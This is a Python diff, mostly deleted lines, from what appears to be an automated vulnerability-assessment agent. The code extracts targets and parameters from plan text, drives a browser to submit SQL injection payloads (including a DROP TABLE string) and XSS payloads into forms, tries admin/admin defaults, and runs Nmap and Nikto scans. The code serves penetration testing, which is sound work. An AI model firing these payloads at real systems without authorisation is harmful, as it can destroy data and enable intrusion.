-            r'\b([a-zA-Z0-9-]+\.(?:co\.uk|com\.au|de|fr|jp|cn))\b',
-            r'(?:target|host|server)[:=\s]+([a-zA-Z0-9.-]+)',
-            r'scanning\s+([a-zA-Z0-9.-]+)',
-            r'against\s+([a-zA-Z0-9.-]+)'
-        ]
-        
-        for pattern in hostname_patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            if matches:
-                return matches[0]
-        
-        return None
-    
-    def _extract_parameters_from_plan(self, plan: Dict[str, str]) -> Dict[str, Any]:
-        """
-        Advanced parameter extraction supporting complex VAPT scenarios
-        """
-        text = f"{plan.get('title', '')} {plan.get('description', '')}"
-        params = {
-            'data': {},
-            'headers': {},
-            'cookies': {},
-            'payloads': [],
-            'form_fields': [],
-            'api_endpoints': [],
-            'auth_methods': [],
-            'file_extensions': [],
-            'technologies': [],
-            'ports': [],
-            'vulnerabilities': []
-        }
-        
-        # Form parameter patterns
-        form_patterns = {
-            'username': r'(?:username|user|login|email)[:=\s]+([^\s,;]+)',
-            'password': r'(?:password|passwd|pwd|pass)[:=\s]+([^\s,;]+)',
-            'token': r'(?:token|csrf|_token)[:=\s]+([^\s,;]+)',
-            'id': r'(?:id|user_id|account_id)[:=\s]+([^\s,;]+)'
-        }
-        
-        for field, pattern in form_patterns.items():
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            if matches:
-                params['data'][field] = matches[0]
-        
-        # Common parameter combinations
-        if any(keyword in text.lower() for keyword in ['login', 'auth', 'credential']):
-            if 'username' not in params['data']:
-                params['data']['username'] = 'admin'
-            if 'password' not in params['data']:
-                params['data']['password'] = 'admin'
-        
-        # Header extraction
-        header_patterns = {
-            'Authorization': r'(?:authorization|auth|bearer)[:=\s]+([^\s,;]+)',
-            'User-Agent': r'(?:user-agent|useragent)[:=\s]+([^\n,;]+)',
-            'Content-Type': r'(?:content-type|contenttype)[:=\s]+([^\s,;]+)',
-            'X-Forwarded-For': r'(?:x-forwarded-for|xff)[:=\s]+([^\s,;]+)',
-            'Referer': r'(?:referer|referrer)[:=\s]+([^\s,;]+)'
-        }
-        
-        for header, pattern in header_patterns.items():
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            if matches:
-                params['headers'][header] = matches[0]
-        
-        # Cookie patterns
-        cookie_patterns = [
-            r'(?:cookie|session)[:=\s]+([^\s,;]+)',
-            r'(?:phpsessid|jsessionid|asp\.net_sessionid)[:=\s]+([^\s,;]+)'
-        ]
-        
-        for pattern in cookie_patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            if matches:
-                params['cookies']['session'] = matches[0]
-        
-        # Payload extraction
-        payload_patterns = [
-            r"'[^']*'",  # SQL injection payloads
-            r'<script[^>]*>[^<]*</script>',  # XSS payloads
-            r'javascript:[^"\']*',  # JavaScript payloads
-            r'\${[^}]+}',  # Template injection
-            r'\.\.\/[^"\']*',  # Path traversal
-            r'union\s+select[^"\']*',  # SQL union
-            r'or\s+1=1[^"\']*'  # Boolean SQL
-        ]
-        
-        for pattern in payload_patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            params['payloads'].extend(matches)
-        
-        # API endpoint extraction
-        api_patterns = [
-            r'/api/[a-zA-Z0-9/._-]+',
-            r'/v\d+/[a-zA-Z0-9/._-]+',
-            r'/graphql/?',
-            r'/rest/[a-zA-Z0-9/._-]+',
-            r'/json/[a-zA-Z0-9/._-]+'
-        ]
-        
-        for pattern in api_patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            params['api_endpoints'].extend(matches)
-        
-        # Technology detection
-        tech_patterns = {
-            'php': r'php[/\s]*([0-9.]+)?',
-            'apache': r'apache[/\s]*([0-9.]+)?',
-            'nginx': r'nginx[/\s]*([0-9.]+)?',
-            'mysql': r'mysql[/\s]*([0-9.]+)?',
-            'wordpress': r'wordpress[/\s]*([0-9.]+)?',
-            'drupal': r'drupal[/\s]*([0-9.]+)?',
-            'joomla': r'joomla[/\s]*([0-9.]+)?'
-        }
-        
-        for tech, pattern in tech_patterns.items():
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            if matches:
-                version = matches[0] if matches[0] else 'unknown'
-                params['technologies'].append({'name': tech, 'version': version})
-        
-        # Port extraction
-        port_patterns = [
-            r':(\d{2,5})\b',  # Port numbers after colon
-            r'port\s+(\d{2,5})',  # "port 8080"
-            r'(\d{2,5})/tcp',  # "8080/tcp"
-            r'(\d{2,5})/udp'   # "8080/udp"
-        ]
-        
-        for pattern in port_patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            for port in matches:
-                if 1 <= int(port) <= 65535:
-                    params['ports'].append(int(port))
-        
-        # File extension patterns
-        file_patterns = [
-            r'\.([a-zA-Z]{2,4})\b',  # File extensions
-            r'upload[^"\']*\.([a-zA-Z]{2,4})',  # Upload contexts
-            r'file[^"\']*\.([a-zA-Z]{2,4})'  # File contexts
-        ]
-        
-        for pattern in file_patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            params['file_extensions'].extend(matches)
-        
-        # Authentication method detection
-        auth_keywords = {
-            'basic': ['basic auth', 'authorization: basic'],
-            'bearer': ['bearer token', 'jwt', 'authorization: bearer'],
-            'oauth': ['oauth', 'oauth2'],
-            'session': ['session', 'cookie auth'],
-            'api_key': ['api key', 'api_key', 'x-api-key']
-        }
-        
-        for auth_type, keywords in auth_keywords.items():
-            if any(keyword in text.lower() for keyword in keywords):
-                params['auth_methods'].append(auth_type)
-        
-        # Vulnerability type detection
-        vuln_keywords = {
-            'sql_injection': ['sql injection', 'sqli', 'union select', 'database error'],
-            'xss': ['xss', 'cross-site scripting', 'reflected', 'stored'],
-            'csrf': ['csrf', 'cross-site request forgery'],
-            'idor': ['idor', 'insecure direct object'],
-            'lfi': ['lfi', 'local file inclusion', 'path traversal'],
-            'rfi': ['rfi', 'remote file inclusion'],
-            'xxe': ['xxe', 'xml external entity'],
-            'ssrf': ['ssrf', 'server-side request forgery'],
-            'rce': ['rce', 'remote code execution', 'command injection'],
-            'auth_bypass': ['authentication bypass', 'auth bypass']
-        }
-        
-        for vuln_type, keywords in vuln_keywords.items():
-            if any(keyword in text.lower() for keyword in keywords):
-                params['vulnerabilities'].append(vuln_type)
-        
-        # Remove duplicates and empty values
-        for key, value in params.items():
-            if isinstance(value, list):
-                params[key] = list(set(value))
-        
-        return params
-    
-    def _extract_form_data_from_plan(self, plan: Dict[str, str]) -> List[Dict[str, Any]]:
-        """
-        Extract detailed form information from VAPT plan descriptions
-        """
-        text = f"{plan.get('title', '')} {plan.get('description', '')}"
-        forms = []
-        
-        # Form action patterns
-        form_patterns = [
-            r'form[^>]*action["\']?=?["\']?([^"\'>\s]+)',
-            r'action["\']?=?["\']?([^"\'>\s]+)',
-            r'endpoint["\']?:?["\']?([^"\'>\s]+)',
-            r'submit\s+to\s+([^\s]+)'
-        ]
-        
-        actions = []
-        for pattern in form_patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            actions.extend(matches)
-        
-        # Input field patterns
-        field_patterns = {
-            'text': r'(?:text|input)[^>]*name["\']?=?["\']?([^"\'>\s]+)',
-            'password': r'(?:password)[^>]*name["\']?=?["\']?([^"\'>\s]+)',
-            'email': r'(?:email)[^>]*name["\']?=?["\']?([^"\'>\s]+)',
-            'hidden': r'(?:hidden)[^>]*name["\']?=?["\']?([^"\'>\s]+)',
-            'file': r'(?:file|upload)[^>]*name["\']?=?["\']?([^"\'>\s]+)',
-            'submit': r'(?:submit|button)[^>]*(?:value|name)["\']?=?["\']?([^"\'>\s]+)'
-        }
-        
-        # Extract common field names from text
-        common_fields = {
-            'username': ['username', 'user', 'login', 'email'],
-            'password': ['password', 'passwd', 'pwd', 'pass'],
-            'token': ['token', 'csrf', '_token', 'csrf_token'],
-            'search': ['search', 'query', 'q'],
-            'id': ['id', 'user_id', 'account_id', 'object_id'],
-            'file': ['file', 'document', 'upload', 'attachment']
-        }
-        
-        detected_fields = []
-        for field_type, field_names in common_fields.items():
-            for field_name in field_names:
-                if field_name in text.lower():
-                    detected_fields.append({
-                        'name': field_name,
-                        'type': field_type,
-                        'required': 'required' in text.lower()
-                    })
-        
-        # Create form objects
-        if actions:
-            for action in actions:
-                form = {
-                    'action': action,
-                    'method': 'POST' if any(method in text.lower() for method in ['post', 'submit']) else 'GET',
-                    'fields': detected_fields,
-                    'enctype': 'multipart/form-data' if 'file' in [f['type'] for f in detected_fields] else 'application/x-www-form-urlencoded'
-                }
-                forms.append(form)
-        elif detected_fields:
-            # Default form if fields found but no action
-            forms.append({
-                'action': '/login',
-                'method': 'POST',
-                'fields': detected_fields,
-                'enctype': 'application/x-www-form-urlencoded'
-            })
-        
-        return forms
-    
-    def _extract_api_info_from_plan(self, plan: Dict[str, str]) -> Dict[str, Any]:
-        """
-        Extract comprehensive API information from plan descriptions
-        """
-        text = f"{plan.get('title', '')} {plan.get('description', '')}"
-        
-        api_info = {
-            'endpoints': [],
-            'methods': [],
-            'parameters': {},
-            'auth_required': False,
-            'rate_limited': False,
-            'versions': [],
-            'content_types': [],
-            'status_codes': []
-        }
-        
-        # API endpoint patterns
-        endpoint_patterns = [
-            r'/api/[a-zA-Z0-9/._-]+',
-            r'/v\d+/[a-zA-Z0-9/._-]+',
-            r'/rest/[a-zA-Z0-9/._-]+',
-            r'/json/[a-zA-Z0-9/._-]+',
-            r'/graphql/?',
-            r'/users/\{?id\}?',
-            r'/accounts/\{?id\}?',
-            r'/admin/[a-zA-Z0-9/._-]*'
-        ]
-        
-        for pattern in endpoint_patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            api_info['endpoints'].extend(matches)
-        
-        # HTTP methods
-        method_patterns = [
-            r'\b(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\b',
-            r'(?:http\s+)?(get|post|put|delete|patch|head|options)(?:\s+request)?'
-        ]
-        
-        for pattern in method_patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            api_info['methods'].extend([m.upper() for m in matches])
-        
-        # Parameter patterns
-        param_patterns = {
-            'id': r'(?:id|user_id|account_id)[:=\s]+([^\s,;]+)',
-            'limit': r'(?:limit|count|size)[:=\s]+(\d+)',
-            'offset': r'(?:offset|skip|start)[:=\s]+(\d+)',
-            'format': r'(?:format|type)[:=\s]+([^\s,;]+)',
-            'filter': r'(?:filter|search|q)[:=\s]+([^\s,;]+)'
-        }
-        
-        for param, pattern in param_patterns.items():
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            if matches:
-                api_info['parameters'][param] = matches[0]
-        
-        # Authentication detection
-        auth_indicators = [
-            'authorization', 'bearer', 'token', 'api key', 'authenticated',
-            'login required', 'auth required', 'jwt'
-        ]
-        
-        api_info['auth_required'] = any(indicator in text.lower() for indicator in auth_indicators)
-        
-        # Rate limiting detection
-        rate_limit_indicators = [
-            'rate limit', 'throttle', 'quota', 'limit exceeded',
-            'too many requests', '429'
-        ]
-        
-        api_info['rate_limited'] = any(indicator in text.lower() for indicator in rate_limit_indicators)
-        
-        # API versions
-        version_patterns = [
-            r'/v(\d+)/',
-            r'version\s+(\d+(?:\.\d+)*)',
-            r'api\s+v(\d+)'
-        ]
-        
-        for pattern in version_patterns:
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            api_info['versions'].extend(matches)
-        
-        # Content types
-        content_type_patterns = [
-            r'application/json',
-            r'application/xml',
-            r'text/xml',
-            r'multipart/form-data',
-            r'application/x-www-form-urlencoded'
-        ]
-        
-        for pattern in content_type_patterns:
-            if re.search(pattern, text, re.IGNORECASE):
-                api_info['content_types'].append(pattern)
-        
-        # Status codes
-        status_patterns = [
-            r'\b(200|201|204|400|401|403|404|405|429|500|502|503)\b',
-            r'status[:\s]+(\d{3})',
-            r'http[:\s]+(\d{3})'
-        ]
-        
-        for pattern in status_patterns:
-            matches = re.findall(pattern, text)
-            api_info['status_codes'].extend([int(code) for code in matches])
-        
-        # Remove duplicates
-        for key, value in api_info.items():
-            if isinstance(value, list):
-                api_info[key] = list(set(value))
-        
-        return api_info
-    
-    def _extract_technology_stack_from_plan(self, plan: Dict[str, str]) -> Dict[str, Any]:
-        """
-        Extract detailed technology stack information for targeted testing
-        """
-        text = f"{plan.get('title', '')} {plan.get('description', '')}"
-        
-        tech_stack = {
-            'web_servers': [],
-            'databases': [],
-            'frameworks': [],
-            'cms': [],
-            'languages': [],
-            'libraries': [],
-            'versions': {},
-            'cves': [],
-            'security_headers': [],
-            'missing_headers': []
-        }
-        
-        # Web server patterns
-        server_patterns = {
-            'apache': r'apache[/\s]*([0-9.]+)?',
-            'nginx': r'nginx[/\s]*([0-9.]+)?',
-            'iis': r'iis[/\s]*([0-9.]+)?',
-            'tomcat': r'tomcat[/\s]*([0-9.]+)?',
-            'jetty': r'jetty[/\s]*([0-9.]+)?'
-        }
-        
-        for server, pattern in server_patterns.items():
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            if matches or server in text.lower():
-                tech_stack['web_servers'].append(server)
-                if matches and matches[0]:
-                    tech_stack['versions'][server] = matches[0]
-        
-        # Database patterns
-        db_patterns = {
-            'mysql': r'mysql[/\s]*([0-9.]+)?',
-            'postgresql': r'postgres(?:ql)?[/\s]*([0-9.]+)?',
-            'oracle': r'oracle[/\s]*([0-9.]+)?',
-            'mongodb': r'mongo(?:db)?[/\s]*([0-9.]+)?',
-            'sqlite': r'sqlite[/\s]*([0-9.]+)?',
-            'mssql': r'(?:mssql|sql\s*server)[/\s]*([0-9.]+)?'
-        }
-        
-        for db, pattern in db_patterns.items():
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            if matches or db in text.lower():
-                tech_stack['databases'].append(db)
-                if matches and matches[0]:
-                    tech_stack['versions'][db] = matches[0]
-        
-        # Framework patterns
-        framework_patterns = {
-            'wordpress': r'wordpress[/\s]*([0-9.]+)?',
-            'drupal': r'drupal[/\s]*([0-9.]+)?',
-            'joomla': r'joomla[/\s]*([0-9.]+)?',
-            'django': r'django[/\s]*([0-9.]+)?',
-            'flask': r'flask[/\s]*([0-9.]+)?',
-            'rails': r'rails[/\s]*([0-9.]+)?',
-            'laravel': r'laravel[/\s]*([0-9.]+)?',
-            'spring': r'spring[/\s]*([0-9.]+)?'
-        }
-        
-        for framework, pattern in framework_patterns.items():
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            if matches or framework in text.lower():
-                tech_stack['frameworks'].append(framework)
-                if matches and matches[0]:
-                    tech_stack['versions'][framework] = matches[0]
-        
-        # Programming language patterns
-        lang_patterns = {
-            'php': r'php[/\s]*([0-9.]+)?',
-            'python': r'python[/\s]*([0-9.]+)?',
-            'java': r'java[/\s]*([0-9.]+)?',
-            'javascript': r'javascript|js',
-            'ruby': r'ruby[/\s]*([0-9.]+)?',
-            'perl': r'perl[/\s]*([0-9.]+)?',
-            'asp.net': r'asp\.net[/\s]*([0-9.]+)?'
-        }
-        
-        for lang, pattern in lang_patterns.items():
-            matches = re.findall(pattern, text, re.IGNORECASE)
-            if matches or lang in text.lower():
-                tech_stack['languages'].append(lang)
-                if matches and matches[0]:
-                    tech_stack['versions'][lang] = matches[0]
-        
-        # Security headers
-        security_headers = [
-            'content-security-policy', 'x-frame-options', 'x-content-type-options',
-            'strict-transport-security', 'x-xss-protection', 'referrer-policy',
-            'feature-policy', 'permissions-policy'
-        ]
-        
-        for header in security_headers:
-            if header in text.lower():
-                tech_stack['security_headers'].append(header)
-        
-        # Missing headers detection
-        missing_indicators = ['missing', 'absent', 'not present', 'lacking']
-        for indicator in missing_indicators:
-            if indicator in text.lower():
-                for header in security_headers:
-                    if header in text.lower():
-                        tech_stack['missing_headers'].append(header)
-        
-        # CVE patterns
-        cve_pattern = r'CVE-\d{4}-\d{4,7}'
-        cves = re.findall(cve_pattern, text, re.IGNORECASE)
-        tech_stack['cves'].extend(cves)
-        
-        # Remove duplicates
-        for key, value in tech_stack.items():
-            if isinstance(value, list):
-                tech_stack[key] = list(set(value))
-        
-        return tech_stack
-    
-    # ===== SPECIFIC TOOL IMPLEMENTATIONS =====
-    async def _manual_sql_injection_test(self, url: str, plan: Dict[str, str]) -> ToolResult:
-        """Manual SQL injection testing using browser automation"""
-        if not await self.browser.start_browser():
-            return ToolResult(False, "Browser SQL Test", "", "Failed to start browser")
-        
-        try:
-            # Navigate to the page
-            page_info = await self.browser.async_goto(url)
-            
-            if 'error' in page_info:
-                return ToolResult(False, "Browser SQL Test", "", f"Navigation failed: {page_info['error']}")
-            
-            vulnerabilities = []
-            
-            # Test each form for SQL injection
-            for form in page_info.get('forms', []):
-                for input_field in form.get('inputs', []):
-                    if input_field.get('type') in ['text', 'password', 'email']:
-                        # Test basic SQL injection payloads
-                        payloads = [
-                            "' OR '1'='1",
-                            "'; DROP TABLE users; --",
-                            "' UNION SELECT 1,2,3 --",
-                            "admin'--",
-                            "' OR 1=1#"
-                        ]
-                        
-                        for payload in payloads:
-                            fill_result = await self.browser.async_fill_form(f"[name='{input_field['name']}']", payload)
-                            
-                            if fill_result.get('success'):
-                                # Submit form and check response
-                                submit_result = await self.browser.async_click("[type='submit']")
-                                if submit_result.get('success'):
-                                    # Check for SQL error indicators
-                                    page_content = await self.browser.async_get_content()
-                                    if any(error in page_content.lower() for error in 
-                                          ['sql syntax', 'mysql', 'oracle', 'postgresql', 'database error']):
-                                        vulnerabilities.append({
-                                            'type': 'SQL Injection',
-                                            'severity': 'High',
-                                            'field': input_field['name'],
-                                            'payload': payload,
-                                            'evidence': 'Database error detected in response'
-                                        })
-            
-            return ToolResult(
-                success=True,
-                tool_name="Browser SQL Injection Test",
-                command="playwright automation",
-                output=f"Tested {len(page_info.get('forms', []))} forms for SQL injection",
-                vulnerabilities_found=vulnerabilities
+            self.logger.error(f"Plan execution error: {e}")
+            return VAPTResult(
+                success=False,
+                tool_name="Plan Execution",
+                command="strategic_test",
+                output="",
+                error=str(e)
             )
-        
-        except Exception as e:
-            return ToolResult(False, "Browser SQL Test", "", f"Error: {str(e)}")
-        finally:
-            await self.browser.close()
-    
-    async def _manual_xss_test(self, url: str, plan: Dict[str, str]) -> ToolResult:
-        """Manual XSS testing using browser automation"""
-        if not await self.browser.start_browser():
-            return ToolResult(False, "Browser XSS Test", "", "Failed to start browser")
-        
-        try:
-            page_info = await self.browser.async_goto(url)
-            
-            if 'error' in page_info:
-                return ToolResult(False, "Browser XSS Test", "", f"Navigation failed: {page_info['error']}")
-            
-            vulnerabilities = []
-            
-            # XSS payloads to test
-            xss_payloads = [
-                "<script>alert('XSS')</script>",
-                "javascript:alert('XSS')",
-                "<img src=x onerror=alert('XSS')>",
-                "<svg onload=alert('XSS')>",
-                "';alert('XSS');//"
-            ]
-            
-            # Test each form input
-            for form in page_info.get('forms', []):
-                for input_field in form.get('inputs', []):
-                    if input_field.get('type') in ['text', 'search', 'email']:
-                        for payload in xss_payloads:
-                            fill_result = await self.browser.async_fill_form(f"[name='{input_field['name']}']", payload)
-                            
-                            if fill_result.get('success'):
-                                submit_result = await self.browser.async_click("[type='submit']")
-                                
-                                if submit_result.get('success'):
-                                    # Check if payload is reflected in response
-                                    page_content = await self.browser.async_get_content()
-                                    if payload in page_content:
-                                        vulnerabilities.append({
-                                            'type': 'Cross-Site Scripting (XSS)',
-                                            'severity': 'High',
-                                            'field': input_field['name'],
-                                            'payload': payload,
-                                            'evidence': 'Payload reflected in response'
-                                        })
-            
-            return ToolResult(
-                success=True,
-                tool_name="Browser XSS Test",
-                command="playwright automation",
-                output=f"Tested {len(xss_payloads)} XSS payloads",
-                vulnerabilities_found=vulnerabilities
-            )
-        
-        except Exception as e:
-            return ToolResult(False, "Browser XSS Test", "", f"Error: {str(e)}")
-        finally:
-            await self.browser.close()
-    
-    async def _run_nmap_scan(self, target: str, plan: Dict[str, str]) -> ToolResult:
-        """Run Nmap scan against target"""
-        try:
-            cmd = [
-                'nmap',
-                '-sV',  # Service version detection
-                '-sC',  # Default scripts
-                '--script=vuln',  # Vulnerability scripts
-                '-O',   # OS detection
-                '-T4',  # Timing template
-                target
-            ]
-            
-            process = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
-            )
-            
-            stdout, stderr = await asyncio.wait_for(
-                process.communicate(),
-                timeout=self.config['timeout']
-            )
-            
-            output = stdout.decode() + stderr.decode()
-            vulnerabilities = self._parse_nmap_output(output)
-            
-            return ToolResult(
-                success=process.returncode == 0,
-                tool_name="Nmap",
-                command=' '.join(cmd),
-                output=output,
-                vulnerabilities_found=vulnerabilities
-            )
-        
-        except Exception as e:
-            return ToolResult(False, "Nmap", "nmap", f"Error: {str(e)}")
-    
-    async def _run_nikto(self, url: str) -> ToolResult:
-        """Run Nikto web server scanner"""
-        try:
-            cmd = [
-                'nikto',
-                '-h', url,
-                '-output', f"{self.config['output_dir']}/nikto_{int(time.time())}.txt"
-            ]
-            
-            process = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE
-            )
-            
-            stdout, stderr = await asyncio.wait_for(
-                process.communicate(),
-                timeout=self.config['timeout']
-            )
-            
-            output = stdout.decode() + stderr.decode()
-            vulnerabilities = self._parse_nikto_output(output)
-            
-            return ToolResult(
-                success=process.returncode == 0,
-                tool_name="Nikto",
-                command=' '.join(cmd),
-                output=output,
-                vulnerabilities_found=vulnerabilities
-            )
-        
-        except Exception as e:
-            return ToolResult(False, "Nikto", "nikto", f"Error: {str(e)}")
-    
-    # ===== ENHANCED OUTPUT PARSING METHODS =====
-    def _parse_sqlmap_output(self, output: str, params: Dict[str, Any] = None, tech_stack: Dict[str, Any] = None) -> List[Dict]:
-        vulnerabilities = []
-        lines = output.split('\n')
-        
-        # Initialize parsing state
-        current_vulnerability = None
-        in_parameter_section = False
-        in_payload_section = False
-        
-        # Enhanced patterns for SQL injection detection
-        sql_patterns = {
-            'parameter_vulnerable': [
-                r'Parameter:\s*(.+?)\s*\(.*?\)\s*is\s*vulnerable',
-                r'Parameter\s*\'(.+?)\'\s*is\s*vulnerable',
-                r'the\s*back-end\s*DBMS\s*is\s*(.+?)(?:\s|$)',
-                r'injectable\s*parameter\s*\'(.+?)\''
-            ],
-            'injection_type': [
-                r'Type:\s*(.+?)(?:\n|$)',
-                r'Technique:\s*(.+?)(?:\n|$)',
-                r'Title:\s*(.+?)(?:\n|$)'
-            ],
-            'payload': [
-                r'Payload:\s*(.+?)(?:\n|$)',
-                r'Vector:\s*(.+?)(?:\n|$)'
-            ],
-            'database_info': [
-                r'back-end\s*DBMS:\s*(.+?)(?:\n|$)',
-                r'web\s*server\s*OS:\s*(.+?)(?:\n|$)',
-                r'web\s*application\s*technology:\s*(.+?)(?:\n|$)'
-            ],
-            'severity_indicators': [
-                r'critical',
-                r'high.*risk',
-                r'time-based.*blind',
-                r'union.*query',
-                r'error-based',
-                r'stacked.*queries'
-            ]
-        }
-        
-        for i, line in enumerate(lines):
-            line = line.strip()
-            
-            # Check for vulnerable parameter
-            for pattern in sql_patterns['parameter_vulnerable']:
-                match = re.search(pattern, line, re.IGNORECASE)
-                if match:
-                    if current_vulnerability:
-                        vulnerabilities.append(current_vulnerability)
-                    
-                    current_vulnerability = {
-                        'type': 'SQL Injection',
-                        'severity': 'Critical',
-                        'tool': 'SQLMap',
-                        'parameter': match.group(1).strip(),
-                        'evidence': line,
-                        'injection_type': 'Unknown',
-                        'payload': '',
-                        'database': 'Unknown',
-                        'risk_level': 'High',
-                        'context': {}
-                    }
-                    
-                    # Add context from extracted parameters
-                    if params:
-                        current_vulnerability['context']['detected_vulns'] = params.get('vulnerabilities', [])
-                        current_vulnerability['context']['auth_methods'] = params.get('auth_methods', [])
-                        current_vulnerability['context']['technologies'] = params.get('technologies', [])
-                    
-                    if tech_stack:
-                        current_vulnerability['context']['tech_stack'] = tech_stack
-                    break
-            
-            # Extract injection type and technique
-            if current_vulnerability:
-                for pattern in sql_patterns['injection_type']:
-                    match = re.search(pattern, line, re.IGNORECASE)
-                    if match:
-                        injection_info = match.group(1).strip()
-                        if 'type:' in line.lower():
-                            current_vulnerability['injection_type'] = injection_info
-                        elif 'technique:' in line.lower():
-                            current_vulnerability['technique'] = injection_info
-                        elif 'title:' in line.lower():
-                            current_vulnerability['title'] = injection_info
-                        break
-                
-                # Extract payload information
-                for pattern in sql_patterns['payload']:
-                    match = re.search(pattern, line, re.IGNORECASE)
-                    if match:
-                        current_vulnerability['payload'] = match.group(1).strip()
-                        break
-                
-                # Extract database information
-                for pattern in sql_patterns['database_info']:
-                    match = re.search(pattern, line, re.IGNORECASE)
-                    if match:
-                        db_info = match.group(1).strip()
-                        if 'dbms' in line.lower():
-                            current_vulnerability['database'] = db_info
-                        elif 'os' in line.lower():
-                            current_vulnerability['os'] = db_info
-                        elif 'technology' in line.lower():
-                            current_vulnerability['technology'] = db_info
-                        break
-                
-                # Determine severity based on technique
-                for pattern in sql_patterns['severity_indicators']:
-                    if re.search(pattern, line, re.IGNORECASE):
-                        if 'critical' in pattern or 'union' in pattern:
-                            current_vulnerability['severity'] = 'Critical'
-                            current_vulnerability['risk_level'] = 'Critical'
-                        elif 'time-based' in pattern or 'blind' in pattern:
-                            current_vulnerability['severity'] = 'High'
-                            current_vulnerability['risk_level'] = 'High'
-                        break
-        
-        # Add the last vulnerability if exists
-        if current_vulnerability:
-            vulnerabilities.append(current_vulnerability)
-        
-        # If no specific vulnerabilities found but SQLMap detected something
-        if not vulnerabilities and any(keyword in output.lower() for keyword in 
-                                      ['parameter', 'vulnerable', 'injection', 'payload']):
-            vulnerabilities.append({
-                'type': 'SQL Injection',
-                'severity': 'Medium',
-                'tool': 'SQLMap',
-                'evidence': 'SQLMap detected potential SQL injection vectors',
-                'parameter': 'Multiple',
-                'injection_type': 'Generic',
-                'payload': 'Various payloads tested',
-                'database': 'Unknown',
-                'risk_level': 'Medium'
-            })
-        
-        return vulnerabilities
-    
-    def _parse_nmap_output(self, output: str) -> List[Dict]:
-        vulnerabilities = []
-        lines = output.split('\n')
-        
-        # Enhanced patterns for network vulnerability detection
-        nmap_patterns = {
-            'open_ports': r'(\d+)/(tcp|udp)\s+open\s+(.+?)(?:\s|$)',
-            'service_version': r'(\d+)/(tcp|udp)\s+open\s+(.+?)\s+(.+?)(?:\s|$)',
-            'os_detection': r'OS:\s*(.+?)(?:\n|$)',
-            'vulnerability_scripts': [
-                r'(\w+):\s*VULNERABLE',
-                r'CVE-(\d{4}-\d{4,7})',
-                r'(\w+):\s*LIKELY\s*VULNERABLE',
-                r'ssl-.*vulnerable',
-                r'smb-.*vulnerable'
-            ],
-            'service_info': r'Service\s*Info:\s*(.+?)(?:\n|$)',
-            'script_results': r'\|\s*(.+?)(?:\n|$)'
-        }
-        
-        current_port = None
-        current_service = None
-        
-        for line in lines:
-            line = line.strip()
-            
-            # Parse open ports and services
-            port_match = re.search(nmap_patterns['open_ports'], line)
-            if port_match:
-                current_port = port_match.group(1)
-                protocol = port_match.group(2)
-                service = port_match.group(3)
-                current_service = service
-                
-                # Check for potentially vulnerable services
-                vulnerable_services = {
-                    'ssh': ['bruteforce', 'weak_auth'],
-                    'ftp': ['anonymous_access', 'bruteforce'],
-                    'telnet': ['unencrypted', 'bruteforce'],
-                    'smtp': ['relay', 'enum'],
-                    'http': ['web_vulnerabilities'],
-                    'https': ['ssl_vulnerabilities'],
-                    'mysql': ['default_creds', 'injection'],
-                    'postgresql': ['default_creds', 'injection'],
-                    'mongodb': ['no_auth', 'injection'],
-                    'redis': ['no_auth', 'command_injection'],
-                    'smb': ['null_session', 'eternal_blue']
-                }
-                
-                for vuln_service, vuln_types in vulnerable_services.items():
-                    if vuln_service.lower() in service.lower():
-                        for vuln_type in vuln_types:
-                            vulnerabilities.append({
-                                'type': f'{vuln_service.upper()} Service Vulnerability',
-                                'severity': 'Medium',
-                                'tool': 'Nmap',
-                                'evidence': f'Open {vuln_service} service on port {current_port}/{protocol}',
-                                'port': current_port,
-                                'protocol': protocol,
-                                'service': service,
-                                'vulnerability_type': vuln_type,
-                                'recommendation': f'Secure {vuln_service} service configuration'
-                            })
-            
-            # Parse service version information
-            version_match = re.search(nmap_patterns['service_version'], line)
-            if version_match and len(version_match.groups()) > 3:
-                port = version_match.group(1)
-                service = version_match.group(3)
-                version = version_match.group(4)
-                
-                # Check for known vulnerable versions
-                vulnerable_versions = {
-                    'apache': ['2.2', '2.4.1', '2.4.2'],
-                    'nginx': ['1.0', '1.1'],
-                    'openssh': ['7.4', '6.6', '5.3'],
-                    'mysql': ['5.0', '5.1', '5.5'],
-                    'php': ['5.3', '5.4', '7.0']
-                }
-                
-                for vuln_service, vuln_versions in vulnerable_versions.items():
-                    if vuln_service in service.lower():
-                        for vuln_version in vuln_versions:
-                            if vuln_version in version:
-                                vulnerabilities.append({
-                                    'type': 'Outdated Service Version',
-                                    'severity': 'High',
-                                    'tool': 'Nmap',
-                                    'evidence': f'{service} version {version} on port {port}',
-                                    'port': port,
-                                    'service': service,
-                                    'version': version,
-                                    'vulnerability_type': 'outdated_version',
-                                    'recommendation': f'Update {service} to latest version'
-                                })
-            
-            # Parse vulnerability script results
-            for pattern in nmap_patterns['vulnerability_scripts']:
-                match = re.search(pattern, line, re.IGNORECASE)
-                if match:
-                    if 'CVE-' in pattern:
-                        cve_id = f"CVE-{match.group(1)}"
-                        vulnerabilities.append({
-                            'type': 'Known CVE Vulnerability',
-                            'severity': 'Critical',
-                            'tool': 'Nmap',
-                            'evidence': line,
-                            'cve_id': cve_id,
-                            'port': current_port,
-                            'service': current_service,
-                            'vulnerability_type': 'cve',
-                            'recommendation': f'Apply security patches for {cve_id}'
-                        })
-                    else:
-                        vuln_name = match.group(1) if match.groups() else 'Unknown'
